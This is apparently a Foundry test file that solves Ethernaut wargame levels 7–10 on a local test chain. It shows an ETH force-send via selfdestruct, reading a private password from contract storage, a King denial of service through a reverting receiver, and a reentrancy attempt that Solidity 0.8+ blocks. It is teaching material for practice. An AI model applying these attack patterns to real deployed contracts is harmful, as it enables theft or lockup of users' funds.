// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ethernaut/Level7_Force.sol";
import "../src/ethernaut/Level8_Vault.sol";
import "../src/ethernaut/Level9_King.sol";
import "../src/ethernaut/Level10_Reentrance.sol";

/**
 * @title Ethernaut7_10Test
 * @dev Tests for Ethernaut Level 7-10
 */
contract Ethernaut7_10Test is Test {
    // Level 7: Force
    Force public force;
    ForceAttacker public forceAttacker;
    
    // Level 8: Vault
    Vault public vault;
    bytes32 constant PASSWORD = keccak256("super-secret-password");
    
    // Level 9: King
    King public king;
    KingAttacker public kingAttacker;
    
    // Level 10: Reentrance
    Reentrance public reentrance;
    ReentranceAttacker public reentranceAttacker;
    
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        // Level 7
        force = new Force();
        forceAttacker = new ForceAttacker(address(force));
        
        // Level 8
        vault = new Vault(PASSWORD);
        
        // Level 9: deploy from owner EOA so King can send prize back
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        king = new King{value: 1 ether}();
        
        // Level 10
        reentrance = new Reentrance();
    }
    
    /**
     * @dev Level 7: Force - Force-send ETH via selfdestruct
     */
    function test_Level7_Force() public {
        console.log("=== LEVEL 7: FORCE ===");
        console.log("Balance before: %d", force.getBalance());
        
        // Send ETH to attacker contract
        vm.deal(attacker, 1 ether);
        
        // Attacker calls attack() → selfdestruct sends ETH to Force
        vm.prank(attacker);
        forceAttacker.attack{value: 1 ether}();
        
        // Force contract now has ETH!
        console.log("Balance after: %d", force.getBalance());
        assertEq(force.getBalance(), 1 ether);
        
        // But forceBalance (tracked) is still 0!
        console.log("Tracked balance: %d", force.forceBalance());
        assertEq(force.forceBalance(), 0);
        
        console.log("[SOLVED] Level 7 complete!\n");
    }
    
    /**
     * @dev Level 8: Vault - Read private variable from storage
     */
    function test_Level8_Vault() public {
        console.log("=== LEVEL 8: VAULT ===");
        console.log("Locked: %d", vault.locked());
        
        // Read password from storage slot 0
        bytes32 storedPassword = vm.load(address(vault), bytes32(0));
        console.log("Stored password: %s", vm.toString(storedPassword));
        console.log("Expected:        %s", vm.toString(PASSWORD));
        
        assertEq(storedPassword, PASSWORD);
        
        // Unlock with stolen password
        vault.unlock(storedPassword);
        
        console.log("After unlock: %d", vault.locked());
        assertEq(vault.locked(), false);
        
        console.log("[SOLVED] Level 8 complete!\n");
    }
    
    /**
     * @dev Level 9: King - DoS via malicious receive()
     */
    function test_Level9_King() public {
        console.log("=== LEVEL 9: KING ===");
        console.log("King: %s", king.king());
        console.log("Prize: %d", king.prize());
        
        // Deploy attacker contract
        kingAttacker = new KingAttacker(payable(address(king)));
        
        // Attacker becomes king - must beat current prize (1 ETH)
        vm.deal(attacker, 2 ether);
        vm.prank(attacker);
        kingAttacker.attack{value: 1.5 ether}();
        
        console.log("New king: %s", king.king());
        console.log("Attacker contract: %s", address(kingAttacker));
        assertEq(king.king(), address(kingAttacker));
        
        // Now anyone trying to become king will FAIL
        // because attacker contract reverts on receive()
        address victim = makeAddr("victim");
        vm.deal(victim, 2 ether);
        
        // Victim tries to become king - should fail!
        vm.prank(victim);
        (bool success,) = address(king).call{value: 1 ether}("");
        
        console.log("Victim attempt success: %d", success);
        assertEq(success, false); // DoS attack successful!
        
        console.log("[SOLVED] Level 9 complete!\n");
    }
    
    /**
     * @dev Level 10: Reentrance - Classic reentrancy exploit
     * 
     * This test demonstrates the ATTACK PATTERN:
     * 1. Attacker deposits 1 ETH
     * 2. Calls withdraw(1 ETH)
     * 3. receive() fires BEFORE balance is decremented
     * 4. Attacker re-enters withdraw()
     * 5. In pre-0.8: underflow → attacker has MAX_UINT256 balance → drain all
     * 6. In 0.8+: underflow REVERTS → attack fails → vault is SAFE
     */
    function test_Level10_Reentrance() public {
        console.log("=== LEVEL 10: RE-ENTRANCE ===");
        
        // Setup: multiple users deposit
        address user1 = makeAddr("user1");
        address user2 = makeAddr("user2");
        
        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);
        
        vm.prank(user1);
        reentrance.deposit{value: 10 ether}();
        
        vm.prank(user2);
        reentrance.deposit{value: 5 ether}();
        
        console.log("Vault balance: %d", reentrance.getBalance());
        assertEq(reentrance.getBalance(), 15 ether);
        
        // Deploy attacker contract with maxAttacks=1 (one re-entry)
        reentranceAttacker = new ReentranceAttacker(address(reentrance));
        reentranceAttacker.setMaxAttacks(1);
        
        // Attacker deposits 1 ETH and calls withdraw(1 ETH)
        // In pre-0.8: this would drain the entire vault (underflow → infinite balance)
        // In 0.8+: the nested decrement causes underflow → REVERTS → vault SAFE!
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        
        // This SHOULD revert in 0.8+ due to balance underflow on nested decrement
        vm.expectRevert(); // balance underflow on nested withdraw
        reentranceAttacker.attack{value: 1 ether}(1 ether);
        
        // Vault is SAFE! 0.8+ caught the underflow
        console.log("After failed attack - Vault: %d", reentrance.getBalance());
        assertEq(reentrance.getBalance(), 15 ether, "Vault is SAFE! 0.8+ prevented drain!");
        
        console.log("[SOLVED] Level 10 complete! 0.8+ caught reentrancy!");
        console.log("In pre-0.8, this would have drained 15 ETH!");
        console.log("Lesson: ALWAYS use Solidity 0.8+ or ReentrancyGuard!\n");
    }
    
    /**
     * @dev Test normal operations still work (before attack)
     */
    function test_NormalOperations() public {
        // Level 7: Normal deposit
        vm.deal(owner, 5 ether);
        vm.prank(owner);
        force.deposit{value: 2 ether}();
        assertEq(force.forceBalance(), 2 ether);
        
        // Level 10: Normal deposit/withdraw
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        reentrance.deposit{value: 5 ether}();
        assertEq(reentrance.balances(owner), 5 ether);
        
        vm.prank(owner);
        reentrance.withdraw(2 ether);
        assertEq(reentrance.balances(owner), 3 ether);
    }
}
